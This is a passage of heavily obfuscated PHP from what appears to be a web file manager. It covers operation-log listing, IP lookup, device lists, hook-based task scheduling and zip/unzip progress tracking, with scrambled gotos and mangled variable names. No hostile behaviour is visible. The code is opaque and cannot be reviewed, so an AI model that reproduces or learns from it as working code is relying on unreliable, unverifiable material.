$_SERVER[Ö‘Øù]; if (!$E‚‰”ë¼†¯) { show_json(array()); } $bÌÚ‘—İí = array(); goto BôŞ¢³Ë¤ï; aÏÃ‘Éë£: if (!empty($E‚‰”ë¼†¯[$CŞÃ¡ßÇÑ[2129]])) { $bÌÚ‘—İí[$CŞÃ¡ßÇÑ[446]] = array($CŞÃ¡ßÇÑ[381], "\x25{$E‚‰”ë¼†¯[$CŞÃ¡ßÇÑ[2129]]}\x25"); } $BáÏ»ööš = $this->_makeOrder()->where($bÌÚ‘—İí)->selectPage(); if (empty($BáÏ»ööš[$CŞÃ¡ßÇÑ[367]])) { show_json(array(), !0, $BáÏ»ööš[$CŞÃ¡ßÇÑ[364]]); } goto B¬Éñè“ÃÈ; B¬Éñè“ÃÈ: $BáÏ»ööš[$CŞÃ¡ßÇÑ[367]] = $this->logList($BáÏ»ööš[$CŞÃ¡ßÇÑ[367]]); return $BáÏ»ööš; goto C±‘ÃËŠî¤; C±‘ÃËŠî¤: } private function ipAddress(&$c®º˜©†ë¬) { $a„¹†ÑÒèÉ =& $_SERVER[Ö‘Øù]; if (!empty($c®º˜©†ë¬[$a„¹†ÑÒèÉ[2129]])) { $e•Ì‡§Áê = IpLocation::get($c®º˜©†ë¬[$a„¹†ÑÒèÉ[2129]]); } else { $e•Ì‡§Áê = LNG($a„¹†ÑÒèÉ[2132]); } $c®º˜©†ë¬[$a„¹†ÑÒèÉ[2133]] = $e•Ì‡§Áê; } private function descZipDownload($cÓôŠé¢ÒĞ, &$C¦š¤‘‰†·) { $a½ƒË¬§Ì’ =& $_SERVER[Ö‘Øù]; if (!isset($cÓôŠé¢ÒĞ[$a½ƒË¬§Ì’[2134]])) { return; } $Cç¥­ì¥ = json_decode($cÓôŠé¢ÒĞ[$a½ƒË¬§Ì’[2134]], !0); foreach ($Cç¥­ì¥ as $eÜ½×»Ÿ„±) { try { $b­¡¦­«Ä = IO::infoFull($eÜ½×»Ÿ„±[$a½ƒË¬§Ì’[76]]); } catch (Exception $cõ½šàó¨) { continue; } $cÓôŠé¢ÒĞ[$a½ƒË¬§Ì’[76]] = $eÜ½×»Ÿ„±[$a½ƒË¬§Ì’[76]]; $C¦š¤‘‰†·[] = $cÓôŠé¢ÒĞ[$a½ƒË¬§Ì’[397]] = $b­¡¦­«Ä[$a½ƒË¬§Ì’[397]]; $C¦š¤‘‰†·[] = $cÓôŠé¢ÒĞ[$a½ƒË¬§Ì’[1947]] = $b­¡¦­«Ä[$a½ƒË¬§Ì’[493]]; break; } return $cÓôŠé¢ÒĞ; } private function getSourceList(&$FŸÔœîÕ†) { $e´ä‰ùÀòê =& $_SERVER[Ö‘Øù]; $DøÓ©‚¥Æ· = array(); foreach ($FŸÔœîÕ† as $Eêâ¬ñ¸™‹ => $F—‡ğŞ×“ù) { goto AÀ‰Ùµ“ù–; e£‚‡Í«×: $DøÓ©‚¥Æ·[] = $Eª‹Àâ¢¾[$e´ä‰ùÀòê[397]]; $DøÓ©‚¥Æ·[] = $Eª‹Àâ¢¾[$e´ä‰ùÀòê[1947]]; if ($Eª‹Àâ¢¾[$e´ä‰ùÀòê[29]] == $e´ä‰ùÀòê[546]) { $DøÓ©‚¥Æ·[] = $Eª‹Àâ¢¾[$e´ä‰ùÀòê[446]][$e´ä‰ùÀòê[1089]]; $DøÓ©‚¥Æ·[] = $Eª‹Àâ¢¾[$e´ä‰ùÀòê[446]][$e´ä‰ùÀòê[1090]]; } goto e¹ßâ¦Ëñ; e¹ßâ¦Ëñ: if ($Eª‹Àâ¢¾[$e´ä‰ùÀòê[29]] == $e´ä‰ùÀòê[1955]) { $DøÓ©‚¥Æ·[] = $Eª‹Àâ¢¾[$e´ä‰ùÀòê[446]][$e´ä‰ùÀòê[397]]; } goto CÈš²Ì¼Ö; AÀ‰Ùµ“ù–: $Eª‹Àâ¢¾ = json_decode($F—‡ğŞ×“ù[$e´ä‰ùÀòê[446]], !0); if ($F—‡ğŞ×“ù[$e´ä‰ùÀòê[29]] == $e´ä‰ùÀòê[1701]) { $Eª‹Àâ¢¾ = $this->descZipDownload($Eª‹Àâ¢¾, $DøÓ©‚¥Æ·); $FŸÔœîÕ†[$Eêâ¬ñ¸™‹][$e´ä‰ùÀòê[446]] = json_encode($Eª‹Àâ¢¾); continue; } if (strpos($F—‡ğŞ×“ù[$e´ä‰ùÀòê[29]], $e´ä‰ùÀòê[1948]) !== 0) { if (!isset($Eª‹Àâ¢¾[$e´ä‰ùÀòê[76]]) || strpos($F—‡ğŞ×“ù[$e´ä‰ùÀòê[29]], $e´ä‰ùÀòê[2135]) !== 0) { continue; } try { $bõ»ñ¯Ùàà = IO::infoFull($Eª‹Àâ¢¾[$e´ä‰ùÀòê[76]]); } catch (Exception $FØ†™ËïğÛ) { continue; } $DøÓ©‚¥Æ·[] = $Eª‹Àâ¢¾[$e´ä‰ùÀòê[397]] = $bõ»ñ¯Ùàà[$e´ä‰ùÀòê[397]]; $DøÓ©‚¥Æ·[] = $Eª‹Àâ¢¾[$e´ä‰ùÀòê[1947]] = $bõ»ñ¯Ùàà[$e´ä‰ùÀòê[493]]; $FŸÔœîÕ†[$Eêâ¬ñ¸™‹][$e´ä‰ùÀòê[446]] = json_encode($Eª‹Àâ¢¾); continue; } goto e£‚‡Í«×; CÈš²Ì¼Ö: } if (!$DøÓ©‚¥Æ·) { return array(); } return Model($e´ä‰ùÀòê[825])->sourceListInfo($DøÓ©‚¥Æ·, !0); } private function logList($e¹å¥³Ø) { goto A§ÜÜÀ‘¯ª; dø¯¡³ÅÙÊ: $Aß¨¶´‹ô = $this->getSourceList($e¹å¥³Ø); $b¯ÓÍ§°Æ´ = $this->typeAll(); $A«İˆ„¨¬ = array(); goto Cìø­Îõ‚ê; A§ÜÜÀ‘¯ª: $Dº¬òÏç™ =& $_SERVER[Ö‘Øù]; $AÛºø•„ä = array_to_keyvalue($e¹å¥³Ø, $Dº¬òÏç™[33], $Dº¬òÏç™[1561]); $bï»Å¨¨ÂŸ = Model($Dº¬òÏç™[533])->userListInfo(array_unique($AÛºø•„ä)); goto dø¯¡³ÅÙÊ; dç’²£ª„†: return $A«İˆ„¨¬; goto a¨ëùøõòØ; Cìø­Îõ‚ê: $FÕ¹åÙÔ = array(); foreach ($e¹å¥³Ø as $CŒ Ñ¦¤½ => $e‘½¸‰ƒ˜É) { goto cÖçÙÍÁä; D‰ğó¤Ë×: unset($e‘½¸‰ƒ˜É[$Dº¬òÏç™[2138]]); $A«İˆ„¨¬[] = $e‘½¸‰ƒ˜É; goto e³»µä†µ; eî‹Ä¾ã¯›: $e‘½¸‰ƒ˜É[$Dº¬òÏç™[1892]] = $a¢ÇÕØĞÌÌ; $cÜğÜ®¦¬ = json_decode($e‘½¸‰ƒ˜É[$Dº¬òÏç™[446]], !0); $e‘½¸‰ƒ˜É[$Dº¬òÏç™[2129]] = isset($cÜğÜ®¦¬[$Dº¬òÏç™[2129]]) ? $cÜğÜ®¦¬[$Dº¬òÏç™[2129]] : $Dº¬òÏç™[33]; goto Fƒ÷Å÷³Ÿ; Fƒ÷Å÷³Ÿ: $this->ipAddress($e‘½¸‰ƒ˜É); if (strpos($aÃŞãé¡†Õ, $Dº¬òÏç™[1948]) === 0 || isset($cÜğÜ®¦¬[$Dº¬òÏç™[1947]])) { goto bŠÁÊ–¯ÊÒ; Fùª¯¸ÎòÜ: if ($cÜğÜ®¦¬[$Dº¬òÏç™[1960]] && $cÜğÜ®¦¬[$Dº¬òÏç™[1960]][$Dº¬òÏç™[406]] == $Dº¬òÏç™[1205]) { $FÕ¹åÙÔ[] = $e‘½¸‰ƒ˜É[$Dº¬òÏç™[395]]; unset($e¹å¥³Ø[$CŒ Ñ¦¤½]); continue; } goto f‡¶íâ¿â½; bÓÈ‡Ğ§›Ò: if ($cÜğÜ®¦¬[$Dº¬òÏç™[29]] == $Dº¬òÏç™[1955]) { $cÜğÜ®¦¬[$Dº¬òÏç™[446]][$Dº¬òÏç™[397]] = $Aß¨¶´‹ô[$cÜğÜ®¦¬[$Dº¬òÏç™[446]][$Dº¬òÏç™[397]]]; } if ($cÜğÜ®¦¬[$Dº¬òÏç™[29]] == $Dº¬òÏç™[1696]) { $cÜğÜ®¦¬[$Dº¬òÏç™[1960]] = $cÜğÜ®¦¬[$Dº¬òÏç™[85]]; $cÜğÜ®¦¬[$Dº¬òÏç™[1947]] = $cÜğÜ®¦¬[$Dº¬òÏç™[1960]][$Dº¬òÏç™[397]]; $cÜğÜ®¦¬[$Dº¬òÏç™[85]] = !1; $cÜğÜ®¦¬[$Dº¬òÏç™[397]] = $Dº¬òÏç™[33]; } if ($cÜğÜ®¦¬[$Dº¬òÏç™[85]] && $cÜğÜ®¦¬[$Dº¬òÏç™[85]][$Dº¬òÏç™[406]] == $Dº¬òÏç™[1205]) { $FÕ¹åÙÔ[] = $e‘½¸‰ƒ˜É[$Dº¬òÏç™[395]]; unset($e¹å¥³Ø[$CŒ Ñ¦¤½]); continue; } goto Fùª¯¸ÎòÜ; bŠÁÊ–¯ÊÒ: $cÜğÜ®¦¬[$Dº¬òÏç™[85]] = $Aß¨¶´‹ô[$cÜğÜ®¦¬[$Dº¬òÏç™[397]]]; $cÜğÜ®¦¬[$Dº¬òÏç™[1960]] = $Aß¨¶´‹ô[$cÜğÜ®¦¬[$Dº¬òÏç™[1947]]]; if ($cÜğÜ®¦¬[$Dº¬òÏç™[29]] == $Dº¬òÏç™[546]) { $cÜğÜ®¦¬[$Dº¬òÏç™[446]][$Dº¬òÏç™[1089]] = $Aß¨¶´‹ô[$cÜğÜ®¦¬[$Dº¬òÏç™[446]][$Dº¬òÏç™[1089]]]; $cÜğÜ®¦¬[$Dº¬òÏç™[446]][$Dº¬òÏç™[1090]] = $Aß¨¶´‹ô[$cÜğÜ®¦¬[$Dº¬òÏç™[446]][$Dº¬òÏç™[1090]]]; } goto bÓÈ‡Ğ§›Ò; f‡¶íâ¿â½: } $e‘½¸‰ƒ˜É[$Dº¬òÏç™[446]] = $cÜğÜ®¦¬; goto D‰ğó¤Ë×; Bˆ÷Æ’‘øº: $e‘½¸‰ƒ˜É[$Dº¬òÏç™[28]] = isset($a¢ÇÕØĞÌÌ[$Dº¬òÏç™[28]]) ? $a¢ÇÕØĞÌÌ[$Dº¬òÏç™[28]] : LNG($Dº¬òÏç™[2132]); $e‘½¸‰ƒ˜É[$Dº¬òÏç™[1995]] = isset($a¢ÇÕØĞÌÌ[$Dº¬òÏç™[1995]]) ? $a¢ÇÕØĞÌÌ[$Dº¬òÏç™[1995]] : $Dº¬òÏç™[33]; $e‘½¸‰ƒ˜É[$Dº¬òÏç™[1464]] = isset($b¯ÓÍ§°Æ´[$aÃŞãé¡†Õ]) ? $b¯ÓÍ§°Æ´[$aÃŞãé¡†Õ] : $AÍìÜğ†ø©; goto eî‹Ä¾ã¯›; cÖçÙÍÁä: $aÃŞãé¡†Õ = $e‘½¸‰ƒ˜É[$Dº¬òÏç™[29]]; $a¢ÇÕØĞÌÌ = isset($bï»Å¨¨ÂŸ[$e‘½¸‰ƒ˜É[$Dº¬òÏç™[1561]]]) ? $bï»Å¨¨ÂŸ[$e‘½¸‰ƒ˜É[$Dº¬òÏç™[1561]]] : !1; $AÍìÜğ†ø© = strpos($aÃŞãé¡†Õ, $Dº¬òÏç™[2136]) === 0 ? LNG($Dº¬òÏç™[2137]) : LNG($Dº¬òÏç™[2132]); goto Bˆ÷Æ’‘øº; e³»µä†µ: } $this->clearSystemPathLog($FÕ¹åÙÔ); goto dç’²£ª„†; a¨ëùøõòØ: } private function clearSystemPathLog($fŠñÂ‚Ğƒé) { $EÏÁÖÄÑ£… =& $_SERVER[Ö‘Øù]; if (count($fŠñÂ‚Ğƒé) == 0) { return; } $a§„ ÉÇÇ = array($EÏÁÖÄÑ£…[395] => array($EÏÁÖÄÑ£…[7], array_unique($fŠñÂ‚Ğƒé))); $this->where($a§„ ÉÇÇ)->delete(); } public function deviceList($Cö¨›Šì’ñ, $f‘ÏÅßÙİë = 0) { $eÂ†Œ½ºÛ¢ =& $_SERVER[Ö‘Øù]; $C–Ë¶®áÁ = array($eÂ†Œ½ºÛ¢[1561] => $Cö¨›Šì’ñ, $eÂ†Œ½ºÛ¢[194] => array($eÂ†Œ½ºÛ¢[1007], $f‘ÏÅßÙİë), $eÂ†Œ½ºÛ¢[29] => $eÂ†Œ½ºÛ¢[1670]); $d°ÍÊ£Â‚Æ = array(); $Cº“™„ŠĞ = $this->field($eÂ†Œ½ºÛ¢[2139])->where($C–Ë¶®áÁ)->order($eÂ†Œ½ºÛ¢[1958])->limit(50)->select(); foreach ($Cº“™„ŠĞ as $DÌ³£ˆÚÍÂ => $cŒŠÉÅôÔõ) { goto D±ï´‘‚¯à; D±ï´‘‚¯à: if ($DÌ³£ˆÚÍÂ > 0 && abs($cŒŠÉÅôÔõ[$eÂ†Œ½ºÛ¢[194]] - $Cº“™„ŠĞ[$DÌ³£ˆÚÍÂ - 1][$eÂ†Œ½ºÛ¢[194]]) < 5) { continue; } $aóæÖôİçÊ = json_decode($cŒŠÉÅôÔõ[$eÂ†Œ½ºÛ¢[446]], !0); $cŒŠÉÅôÔõ[$eÂ†Œ½ºÛ¢[2129]] = isset($aóæÖôİçÊ[$eÂ†Œ½ºÛ¢[2129]]) ? $aóæÖôİçÊ[$eÂ†Œ½ºÛ¢[2129]] : $eÂ†Œ½ºÛ¢[33]; goto Dæà¿”Ô‡é; Dæà¿”Ô‡é: unset($aóæÖôİçÊ[$eÂ†Œ½ºÛ¢[2129]]); $CÙ¯‹´µ• = $this->deviceType($aóæÖôİçÊ[$eÂ†Œ½ºÛ¢[1949]]); if (isset($d°ÍÊ£Â‚Æ[$CÙ¯‹´µ•])) { continue; } goto F¬”œèªİ; F¬”œèªİ: $this->ipAddress($cŒŠÉÅôÔõ); $cŒŠÉÅôÔõ[$eÂ†Œ½ºÛ¢[446]] = $aóæÖôİçÊ; $d°ÍÊ£Â‚Æ[$CÙ¯‹´µ•] = $cŒŠÉÅôÔõ; goto BíÇ³¬¬ùï; BíÇ³¬¬ùï: } return array_values($d°ÍÊ£Â‚Æ); } public function deviceType($CâÀ‹ë¶¹ó) { return $CâÀ‹ë¶¹ó; } } goto D÷Ôƒ–‹Ü; EÂ²…ÇÖ : class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($BêŞâŠ˜ŒÚ, $C³šİ• ¢ = 5.0) { if (!$BêŞâŠ˜ŒÚ) { return; } $f é¬’áí‚ = Cache::get($BêŞâŠ˜ŒÚ); if (!$f é¬’áí‚ || timeFloat() - floatVal($f é¬’áí‚) >= $C³šİ• ¢) { Cache::set($BêŞâŠ˜ŒÚ, timeFloat(), $C³šİ• ¢ * 10); return !0; } return !1; } public static function timeLimitCall($cì§·Ší, $E‡Á¬Ø ºê, $b•››‹ôí¦, $B›Š–¯Îˆ° = 5.0) { goto BòŠŸè‰Ë; BòŠŸè‰Ë: $A¶¾àæ¤¤˜ =& $_SERVER[Ö‘Øù]; if (!$cì§·Ší || !$E‡Á¬Ø ºê) { return; } self::$asyncAdd = !0; goto Dï’Â«‘Ğ; f´ãï¿ŠÌ‚: Cache::set($E¦ÚÚ“ï¸Ü, $dïš…À¤à¸, 60); Cache::removeMemory($E¦ÚÚ“ï¸Ü); write_log($A¶¾àæ¤¤˜[1644] . $cì§·Ší . $A¶¾àæ¤¤˜[68] . $E‡Á¬Ø ºê, $A¶¾àæ¤¤˜[1638]); goto EéÈÃëÍöñ; C¹ÔŸ¹ª¤: if (is_array($dïš…À¤à¸[$cì§·Ší])) { $F²Ò©Ò·İæ[$A¶¾àæ¤¤˜[1643]] = $dïš…À¤à¸[$cì§·Ší][$A¶¾àæ¤¤˜[1643]]; } if (is_array($dïš…À¤à¸[$cì§·Ší])) { if (timeFloat() - $dïš…À¤à¸[$cì§·Ší][$A¶¾àæ¤¤˜[1642]] < $F²Ò©Ò·İæ[$A¶¾àæ¤¤˜[197]] * 0.3) { return; } $F²Ò©Ò·İæ[$A¶¾àæ¤¤˜[1643]] = $dïš…À¤à¸[$cì§·Ší][$A¶¾àæ¤¤˜[1643]]; } $dïš…À¤à¸[$cì§·Ší] = $F²Ò©Ò·İæ; goto f´ãï¿ŠÌ‚; Dï’Â«‘Ğ: $E¦ÚÚ“ï¸Ü = $A¶¾àæ¤¤˜[1641]; $dïš…À¤à¸ = Cache::get($E¦ÚÚ“ï¸Ü, !0); $F²Ò©Ò·İæ = array($A¶¾àæ¤¤˜[1642] => timeFloat(), $A¶¾àæ¤¤˜[1643] => timeFloat(), $A¶¾àæ¤¤˜[262] => $E‡Á¬Ø ºê, $A¶¾àæ¤¤˜[1636] => $b•››‹ôí¦, $A¶¾àæ¤¤˜[197] => $B›Š–¯Îˆ°); goto C¹ÔŸ¹ª¤; EéÈÃëÍöñ: } public static function timeLimitCallLoop() { goto a¥ìá½¥­’; eƒ÷çåñ­Ê: $f”¦Ì‡İªŞ = array(); foreach ($Cˆİ¿ŸÈ½ as $D¦‹ÓÊöŞò => $bƒ¨ÅÇº¤) { if ($e†»¢®ÜŠ¢ - $bƒ¨ÅÇº¤[$AÄ¦¯ŒÈ‘¬[1643]] > $bƒ¨ÅÇº¤[$AÄ¦¯ŒÈ‘¬[197]]) { $f›·‰ø’ = !0; try { Hook::apply($bƒ¨ÅÇº¤[$AÄ¦¯ŒÈ‘¬[262]], $bƒ¨ÅÇº¤[$AÄ¦¯ŒÈ‘¬[1636]]); write_log($AÄ¦¯ŒÈ‘¬[1646] . $D¦‹ÓÊöŞò . $AÄ¦¯ŒÈ‘¬[68] . $bƒ¨ÅÇº¤[$AÄ¦¯ŒÈ‘¬[262]] . $AÄ¦¯ŒÈ‘¬[1647] . ACTION, $AÄ¦¯ŒÈ‘¬[1638]); } catch (Exception $bÅ×õ—ÑŸ) { } continue; } $f”¦Ì‡İªŞ[$D¦‹ÓÊöŞò] = $bƒ¨ÅÇº¤; } if (!$f›·‰ø’) { return; } goto bÚÃ³¡†; a¥ìá½¥­’: $AÄ¦¯ŒÈ‘¬ =& $_SERVER[Ö‘Øù]; $A„¦­ù¥¡Ä = array($AÄ¦¯ŒÈ‘¬[1645]); $AÎˆšù‡ÌĞ = in_array(strtolower(ACTION), $A„¦­ù¥¡Ä); goto EŞàÒâÆ¸˜; cÂìÕö—Â: if (!$Cˆİ¿ŸÈ½ || count($Cˆİ¿ŸÈ½) <= 0) { return; } $f›·‰ø’ = !1; $e†»¢®ÜŠ¢ = timeFloat(); goto eƒ÷çåñ­Ê; EŞàÒâÆ¸˜: if (!$AÎˆšù‡ÌĞ && !self::$asyncAdd) { return; } $D¤Ò”íÚ‹Ø = $AÄ¦¯ŒÈ‘¬[1641]; $Cˆİ¿ŸÈ½ = Cache::get($D¤Ò”íÚ‹Ø, !0); goto cÂìÕö—Â; bÚÃ³¡†: if (!$f”¦Ì‡İªŞ) { return Cache::remove($D¤Ò”íÚ‹Ø); } Cache::set($D¤Ò”íÚ‹Ø, $f”¦Ì‡İªŞ, 60); Cache::removeMemory($D¤Ò”íÚ‹Ø); goto B¡Ó°—ˆµ; B¡Ó°—ˆµ: } public static function finished($d õ‡§Øô¯, $F‰ÏÔ«¬Øî) { $E—÷ÉÍÃŸ‚ =& $_SERVER[Ö‘Øù]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($E—÷ÉÍÃŸ‚[262] => $d õ‡§Øô¯, $E—÷ÉÍÃŸ‚[1636] => $F‰ÏÔ«¬Øî); } private static function finishedRun() { $dËó’„ ‹Ä =& $_SERVER[Ö‘Øù]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $DÓÒš‹Š…) { try { Hook::apply($DÓÒš‹Š…[$dËó’„ ‹Ä[262]], $DÓÒš‹Š…[$dËó’„ ‹Ä[1636]]); } catch (Exception $FãƒÖâµ·±) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto C¦·îŠò”»; C¦·îŠò”»: $B¸ÑŞ˜æ¥’ =& $_SERVER[Ö‘Øù]; parent::startAfter(); Hook::bind($B¸ÑŞ˜æ¥’[1648], array($this, $B¸ÑŞ˜æ¥’[1649])); goto BÀ¿ÈĞé˜Î; BÀ¿ÈĞé˜Î: Hook::bind($B¸ÑŞ˜æ¥’[1123], array($this, $B¸ÑŞ˜æ¥’[1650])); $Dâ‘ïøñ†Õ =& $this->task; $Dâ‘ïøñ†Õ[$B¸ÑŞ˜æ¥’[1651]] = $B¸ÑŞ˜æ¥’[1128]; goto DŞĞ¬øˆ¹—; DŞĞ¬øˆ¹—: if (!$Dâ‘ïøñ†Õ[$B¸ÑŞ˜æ¥’[1464]]) { $Dâ‘ïøñ†Õ[$B¸ÑŞ˜æ¥’[1464]] = LNG($B¸ÑŞ˜æ¥’[1652]); } goto A³¸„‰·Ğ°; A³¸„‰·Ğ°: } protected function endAfter() { $Cøßˆ¹­ =& $_SERVER[Ö‘Øù]; parent::endAfter(); Hook::unbind($Cøßˆ¹­[1648], array($this, $Cøßˆ¹­[1649])); Hook::unbind($Cøßˆ¹­[1123], array($this, $Cøßˆ¹­[1650])); } public function updateAfter() { $eßé²ÄŸÏ =& $_SERVER[Ö‘Øù]; $bîÜùêÁ”µ =& $this->task; if (!$bîÜùêÁ”µ[$eßé²ÄŸÏ[1056]] || !$bîÜùêÁ”µ[$eßé²ÄŸÏ[756]]) { return; } if ($bîÜùêÁ”µ[$eßé²ÄŸÏ[1651]] == $eßé²ÄŸÏ[1128]) { $CŠí‹Œ˜º½ = 0; if ($bîÜùêÁ”µ[$eßé²ÄŸÏ[1607]]) { $CŠí‹Œ˜º½ = $bîÜùêÁ”µ[$eßé²ÄŸÏ[1608]] / $bîÜùêÁ”µ[$eßé²ÄŸÏ[1607]]; } $bîÜùêÁ”µ[$eßé²ÄŸÏ[1562]] = $CŠí‹Œ˜º½ * 0.3; } else { if ($bîÜùêÁ”µ[$eßé²ÄŸÏ[1651]] == $eßé²ÄŸÏ[311]) { $CŠí‹Œ˜º½ = $bîÜùêÁ”µ[$eßé²ÄŸÏ[1070]] / $bîÜùêÁ”µ[$eßé²ÄŸÏ[1056]]; $bîÜùêÁ”µ[$eßé²ÄŸÏ[1562]] = 0.3 + $CŠí‹Œ˜º½ * 0.4; } else { if ($bîÜùêÁ”µ[$eßé²ÄŸÏ[1651]] == $eßé²ÄŸÏ[107]) { $fÁä·†ÖØĞ = 0; if ($bîÜùêÁ”µ[$eßé²ÄŸÏ[1609]] == $eßé²ÄŸÏ[107]) { $fÁä·†ÖØĞ = $bîÜùêÁ”µ[$eßé²ÄŸÏ[1608]]; } $CŠí‹Œ˜º½ = ($bîÜùêÁ”µ[$eßé²ÄŸÏ[1612]] + $fÁä·†ÖØĞ) / $bîÜùêÁ”µ[$eßé²ÄŸÏ[756]]; $bîÜùêÁ”µ[$eßé²ÄŸÏ[1562]] = 0.3 + 0.4 + $CŠí‹Œ˜º½ * 0.3; } } } if ($bîÜùêÁ”µ[$eßé²ÄŸÏ[1562]] > 0) { $E¬‚ô²ñŞ = timeFloat() - $bîÜùêÁ”µ[$eßé²ÄŸÏ[782]] - $bîÜùêÁ”µ[$eßé²ÄŸÏ[1565]]; $bîÜùêÁ”µ[$eßé²ÄŸÏ[1566]] = $E¬‚ô²ñŞ * (1 - $bîÜùêÁ”µ[$eßé²ÄŸÏ[1562]]) / $bîÜùêÁ”µ[$eßé²ÄŸÏ[1562]]; } } public function addFile($c£Ÿ¦¹ó‡Ä) { goto c™‘¿Ë¤ñ; Bø¡¢Ğ§ò: $D’¢ğøØ•š[$F ÛìÏÖ¼·[1605]] = $eôæ¤ŸìÚã[$F ÛìÏÖ¼·[28]]; $D’¢ğøØ•š[$F ÛìÏÖ¼·[1607]] = $eôæ¤ŸìÚã[$F ÛìÏÖ¼·[78]]; $D’¢ğøØ•š[$F ÛìÏÖ¼·[1608]] = 0; goto F­Ş½½‚×; D´¹Øğøë: $this->update(); goto B®š£ë±ö; F­Ş½½‚×: $D’¢ğøØ•š[$F ÛìÏÖ¼·[1058]] = $F ÛìÏÖ¼·[1627]; $D’¢ğøØ•š[$F ÛìÏÖ¼·[1609]] = $F ÛìÏÖ¼·[1128]; $D’¢ğøØ•š[$F ÛìÏÖ¼·[756]] = $eôæ¤ŸìÚã[$F ÛìÏÖ¼·[78]]; goto Eå˜äíš„ß; c™‘¿Ë¤ñ: $F ÛìÏÖ¼· =& $_SERVER[Ö‘Øù]; $D’¢ğøØ•š =& $this->task; $eôæ¤ŸìÚã = IO::info($c£Ÿ¦¹ó‡Ä); goto Bø¡¢Ğ§ò; Eå˜äíš„ß: $D’¢ğøØ•š[$F ÛìÏÖ¼·[1056]] = 1; $e‚²‰¯Ñá² = 0; $D’¢ğøØ•š[$F ÛìÏÖ¼·[1616]] = array($F ÛìÏÖ¼·[1617] => $e‚²‰¯Ñá² + 1, $F ÛìÏÖ¼·[415] => $eôæ¤ŸìÚã[$F ÛìÏÖ¼·[28]], $F ÛìÏÖ¼·[76] => $eôæ¤ŸìÚã[$F ÛìÏÖ¼·[76]], $F ÛìÏÖ¼·[514] => $eôæ¤ŸìÚã[$F ÛìÏÖ¼·[514]] ? $eôæ¤ŸìÚã[$F ÛìÏÖ¼·[514]] : $eôæ¤ŸìÚã[$F ÛìÏÖ¼·[76]]); goto D´¹Øğøë; B®š£ë±ö: } public function unzipAfter($BæÀ¿ó¼ÓÊ) { goto FÇÓÓØ²Öó; aù‘•¸ùáË: $B–âèŞÛ¸[$DÛÉ§Ğì¿§[1070]] = 0; $B–âèŞÛ¸[$DÛÉ§Ğì¿§[1607]] = 0; $B–âèŞÛ¸[$DÛÉ§Ğì¿§[1608]] = 0; goto D œëùäßê; FÇÓÓØ²Öó: $DÛÉ§Ğì¿§ =& $_SERVER[Ö‘Øù]; $B–âèŞÛ¸ =& $this->task; $B–âèŞÛ¸[$DÛÉ§Ğì¿§[1651]] = $DÛÉ§Ğì¿§[107]; goto b®èƒœ­Á; b®èƒœ­Á: $dË—í³¡¨ = IO::infoWithChildren($BæÀ¿ó¼ÓÊ); $bŒ–…²¬Ô‹ = 0; $B–âèŞÛ¸[$DÛÉ§Ğì¿§[1616]] = array($DÛÉ§Ğì¿§[1617] => $bŒ–…²¬Ô‹ + 1, $DÛÉ§Ğì¿§[415] => $dË—í³¡¨[$DÛÉ§Ğì¿§[28]], $DÛÉ§Ğì¿§[76] => $dË—í³¡¨[$DÛÉ§Ğì¿§[76]], $DÛÉ§Ğì¿§[514] => $dË—í³¡¨[$DÛÉ§Ğì¿§[514]] ? $dË—í³¡¨[$DÛÉ§Ğì¿§[514]] : $dË—í³¡¨[$DÛÉ§Ğì¿§[76]]); goto eˆñË„ï…“; eˆñË„ï…“: if ($dË—í³¡¨[$DÛÉ§Ğì¿§[29]] == $DÛÉ§Ğì¿§[193]) { $B–âèŞÛ¸[$DÛÉ§Ğì¿§[1056]] = 1; } else { $B–âèŞÛ¸[$DÛÉ§Ğì¿§[1056]] = $dË—í³¡¨[$DÛÉ§Ğì¿§[81]][$DÛÉ§Ğì¿§[79]]; } $B–âèŞÛ¸[$DÛÉ§Ğì¿§[1058]] = $DÛÉ§Ğì¿§[33]; $B–âèŞÛ¸[$DÛÉ§Ğì¿§[1609]] = 0; goto aù‘•¸ùáË; D œëùäßê: $B–âèŞÛ¸[$DÛÉ§Ğì¿§[1605]] = $DÛÉ§Ğì¿§[33]; $B–âèŞÛ¸[$DÛÉ§Ğì¿§[1612]] = 0; $B–âèŞÛ¸[$DÛÉ§Ğì¿§[756]] = $dË—í³¡¨[$DÛÉ§Ğì¿§[78]]; goto BŒÄğ½Ó; BŒÄğ½Ó: $this->update(); self::log($DÛÉ§Ğì¿§[1653] . json_encode(array($B–âèŞÛ¸, $dË—í³¡¨))); goto Eã¥›èšç»; Eã¥›èšç»: } public function nameParse($FµˆÛğ˜ò‰) { goto aÁòÅç­›‹; D‘«‡ˆƒƒÆ: $this->update(); goto BÖ¶°œ†–¦; FäØåõŞ«: $aïç™æò»õ = get_path_this($FµˆÛğ˜ò‰); if (strstr($aïç™æò»õ, $C»£âÇçöÊ[95])) { $BìªÙ»˜¯˜[$C»£âÇçöÊ[1070]] += 1; $BìªÙ»˜¯˜[$C»£âÇçöÊ[1056]] += 1; } $BìªÙ»˜¯˜[$C»£âÇçöÊ[1605]] = $FµˆÛğ˜ò‰; goto D‘«‡ˆƒƒÆ; aÁòÅç­›‹: $C»£âÇçöÊ =& $_SERVER[Ö‘Øù]; $BìªÙ»˜¯˜ =& $this->task; if ($BìªÙ»˜¯˜[$C»£âÇçöÊ[1651]] == $C»£âÇçöÊ[1128]) { $BìªÙ»˜¯˜[$C»£âÇçöÊ[1651]] = $C»£âÇçöÊ[311]; $BìªÙ»˜¯˜[$C»£âÇçöÊ[1612]] = 0; $BìªÙ»˜¯˜[$C»£âÇçöÊ[756]] = 0; } goto FäØåõŞ«; BÖ¶°œ†–¦: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $eµô³à =& $_SERVER[Ö‘Øù]; parent::startAfter(); Hook::bind($eµô³à[1654], array($this, $eµô³à[1649])); $Bƒ‚•¹±êÇ =& $this->task; $Bƒ‚•¹±êÇ[$eµô³à[1651]] = $eµô³à[1128]; if (!$Bƒ‚•¹±êÇ[$eµô³à[1464]]) { $Bƒ‚•¹±êÇ[$eµô³à[1464]] = LNG($eµô³à[1655]); } } protected function endAfter() { $BÄ·¿…š Ú =& $_SERVER[Ö‘Øù]; parent::endAfter(); Hook::unbind($BÄ·¿…š Ú[1654], array($this, $BÄ·¿…š Ú[1649])); } public function updateAfter() { $d •„ìöâ =& 